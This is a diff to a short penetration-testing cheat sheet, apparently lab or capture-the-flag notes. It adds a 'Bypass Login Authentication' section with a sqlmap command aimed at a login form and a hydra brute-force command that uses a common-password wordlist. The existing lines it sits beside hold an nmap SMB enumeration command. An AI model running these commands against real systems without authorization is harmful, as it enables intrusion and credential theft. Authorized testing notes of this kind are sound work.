@@ -14,3 +14,15 @@ We use this for SMB:
 ```bash
 nmap -p 139,445 --script=smb-enum-shares,smb-enum-users <target_ip>
 ```
+
+## Bypass Login Authentication
+For SQL injection, use sqlmap:
+```bash
+sqlmap -u http://target.com/login.php --forms --risk=2 --level=2
+```
+*Using risk = 3 is destructive (last resort)*
+
+For bruteforcing, use hydra:
+```bash
+hydra -L users.txt -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt 10.10.1.4 http-get /
+```
